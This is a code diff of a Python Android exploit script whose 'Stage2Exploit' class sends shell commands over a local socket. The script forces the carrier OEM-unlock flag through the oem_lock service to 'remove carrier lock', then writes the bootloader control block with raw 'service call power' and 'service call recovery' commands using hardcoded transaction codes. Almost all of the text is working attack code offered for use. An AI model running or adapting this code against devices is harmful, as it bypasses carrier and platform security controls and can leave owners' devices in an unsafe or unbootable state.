@@ -24,15 +24,10 @@ def swap_endianness(bytes_: bytes) -> bytes:
     return result
 
 
-# https://stackoverflow.com/a/53198696
-
-
 def parse_service_result(service_result: str) -> bytes:
-    'decodes the raw response from the "service call" AOSP command line utility'
     EXPRESSION = re.compile(
         r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
     )
-
     matched_any = False
     result = b""
     for line in service_result.split("\n"):
@@ -41,20 +36,9 @@ def parse_service_result(service_result: str) -> bytes:
             continue
         matched_any = True
         result += codecs.decode(matched[1].replace(" ", ""), "hex")
-    # print(swap_endianness(result)[4:].decode("utf-16le"))
     if not matched_any:
         raise ZygoteInjectionException("service call failed")
     return swap_endianness(result)
-
-
-# aosp/frameworks/base/core/java/android/service/oemlock/IOemLockService.aidl
-# 0 = String getLockName();
-# 1 = void setOemUnlockAllowedByCarrier(boolean allowed, in byte[] signature);
-# 2 = boolean isOemUnlockAllowedByCarrier();
-# 3 = void setOemUnlockAllowedByUser(boolean allowed);
-# 4 = boolean isOemUnlockAllowedByUser();
-# 5 = boolean isOemUnlockAllowed();
-# 6 = boolean isDeviceOemUnlocked();
 
 
 def parse_boolean_result(result: bytes) -> bool:
@@ -65,32 +49,13 @@ def parse_boolean_result(result: bytes) -> bool:
     return bool(number)
 
 
-# ----- Load IOemLockService (既存) -----
+# IOemLockService はそのまま（AIDL パーサーを使用）
 with open(Path(__file__).parent / "IOemLockService.aidl") as handle:
     oem_lock_service_aidl = handle.read()
 oem_lock_service = parse_aidl_interface(
     aidl.fromstring(oem_lock_service_aidl), "IOemLockService"
 )
-
-# ----- Load IPowerManager (追加) -----
-with open(Path(__file__).parent / "IPowerManager.aidl") as handle:
-    power_service_aidl = handle.read()
-power_service = parse_aidl_interface(
-    aidl.fromstring(power_service_aidl), "IPowerManager"
-)
-
-# ----- Load IRecoverySystem (追加) -----
-with open(Path(__file__).parent / "IRecoverySystem.aidl") as handle:
-    recovery_service_aidl = handle.read()
-recovery_service = parse_aidl_interface(
-    aidl.fromstring(recovery_service_aidl), "IRecoverySystem"
-)
-
-known_services = {
-    "oem_lock": oem_lock_service,
-    "power": power_service,
-    "recovery": recovery_service,
-}
+known_services = {"oem_lock": oem_lock_service}
 
 
 class Stage2Exploit:
@@ -120,7 +85,6 @@ class Stage2Exploit:
         service_result = device_socket.recv(10000).decode("utf-8")
 
         return_value = parse_service_result(service_result)
-        # add an int32 for the status code
         parsed_return_value = service_function.parse_return(return_value)
         status_code = parsed_return_value[0]
 
@@ -144,7 +108,6 @@ class Stage2Exploit:
     def exploit_stage2(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as device_socket:
             device_socket.connect(("127.0.0.1", self.port))
-            # in case there is already a partially typed command
             device_socket.sendall(b"\n")
 
             # ----- OEM unlock (完全にオリジナル) -----
@@ -155,13 +118,10 @@ class Stage2Exploit:
                 device_socket, "oem_lock", "isOemUnlockAllowed"
             )
             if not allowed_by_carrier:
-                print(
-                    "OEM unlock is blocked by carrier, attempting to remove carrier lock"
-                )
+                print("OEM unlock is blocked by carrier, attempting to remove carrier lock")
                 self.call_service(
                     device_socket, "oem_lock", "setOemUnlockAllowedByCarrier", 1
                 )
-                # verify that the unlock worked
                 if self.call_service(
                     device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
                 ):
@@ -170,9 +130,7 @@ class Stage2Exploit:
                     print(f"* {message} *")
                     print("*" * (len(message) + 4))
                     print("This means you MIGHT be able to root your device!")
-                    print(
-                        'Enable OEM unlock in settings and attempt to unlock the bootloader via "fastboot oem unlock"'
-                    )
+                    print('Enable OEM unlock in settings and attempt to unlock the bootloader via "fastboot oem unlock"')
                     print("This may or may not work depending on your device model")
                 else:
                     print("Could not bypass carrier OEM unlock")
@@ -185,74 +143,44 @@ class Stage2Exploit:
                 if not self.call_service(
                     device_socket, "oem_lock", "isOemUnlockAllowedByUser"
                 ):
-                    print(
-                        "Could not change user OEM unlock, please enable it in developer options"
-                    )
+                    print("Could not change user OEM unlock, please enable it in developer options")
             if not oem_unlock_allowed and self.call_service(
                 device_socket, "oem_lock", "isOemUnlockAllowed"
             ):
                 print("OEM unlock is now allowed!")
             if self.call_service(device_socket, "oem_lock", "isDeviceOemUnlocked"):
-                print(
-                    'Your bootloader seems to be unlocked, try running "fastboot flashing ..."'
-                )
+                print('Your bootloader seems to be unlocked, try running "fastboot flashing ..."')
 
-            print("\n=== BCB Write Attempts (bootonce-bootloader) ===")
+            print("\n=== BCB Write (direct service call) ===")
 
-            print("\n[1] IPowerManager.reboot(\"bootloader\")")
-            try:
-                self.call_service(
-                    device_socket,
-                    "power",
-                    "reboot",
-                    False,          # confirm
-                    "bootloader", 
-                    False           # wait
-                )
-                print("SUCCESS: reboot command accepted, BCB written.")
-            except Exception as e:
-                print(f"FAILED: {e}")
+            cmd = 'service call power 18 i32 0 s16 "bootloader" i32 0\n'
+            print(f"[CMD] {cmd.strip()}")
+            device_socket.sendall(cmd.encode())
+            resp = device_socket.recv(10000).decode()
+            print(f"[RESPONSE]\n{resp}")
+            if "Parcel" in resp and "Error" not in resp:
+                print("[+] BCB write via power.reboot succeeded (device will reboot to bootloader on next restart)")
+            else:
+                print("[-] power.reboot may have failed, trying fallback...")
 
-            # 2. IRecoverySystem.setupBcb with multiple commands
-            print("\n[2] IRecoverySystem.setupBcb")
-            for cmd in ["bootonce-bootloader", "reboot-bootloader", "bootloader", "fastboot"]:
-                try:
-                    result = self.call_service(
-                        device_socket,
-                        "recovery",
-                        "setupBcb",
-                        cmd
-                    )
-                    if result is True:
-                        print(f"  [+] setupBcb('{cmd}') succeeded (BCB written)")
-                    else:
-                        print(f"  [-] setupBcb('{cmd}') returned {result}")
-                except Exception as e:
-                    print(f"  [!] setupBcb('{cmd}') failed: {e}")
+            cmd = 'service call recovery 2 s16 "bootonce-bootloader"\n'
+            print(f"\n[CMD] {cmd.strip()}")
+            device_socket.sendall(cmd.encode())
+            resp = device_socket.recv(10000).decode()
+            print(f"[RESPONSE]\n{resp}")
+            if "Parcel(00000000 00000001" in resp:
+                print("[+] setupBcb succeeded (BCB written)")
+            elif "Parcel(00000000 00000000" in resp:
+                print("[-] setupBcb returned false (write failed)")
+            else:
+                print("[?] setupBcb response unknown")
 
-            # 3. IRecoverySystem.clearBcb (to test access)
-            print("\n[3] IRecoverySystem.clearBcb")
-            try:
-                result = self.call_service(device_socket, "recovery", "clearBcb")
-                if result is True:
-                    print("  [+] clearBcb succeeded (BCB cleared)")
-                else:
-                    print(f"  [-] clearBcb returned {result}")
-            except Exception as e:
-                print(f"  [!] clearBcb failed: {e}")
 
-            # 4. IRecoverySystem.rebootRecoveryWithCommand (dangerous)
-            print("\n[4] IRecoverySystem.rebootRecoveryWithCommand(\"--bootonce-bootloader\")")
-            try:
-                self.call_service(
-                    device_socket,
-                    "recovery",
-                    "rebootRecoveryWithCommand",
-                    "--bootonce-bootloader"
-                )
-                print("  [+] rebootRecoveryWithCommand accepted (device will reboot to recovery)")
-            except Exception as e:
-                print(f"  [!] rebootRecoveryWithCommand failed: {e}")
+            cmd = 'service call recovery 3\n'
+            print(f"\n[CMD] {cmd.strip()}")
+            device_socket.sendall(cmd.encode())
+            resp = device_socket.recv(10000).decode()
+            print(f"[RESPONSE]\n{resp}")
 
             print("\n=== Done ===")
 
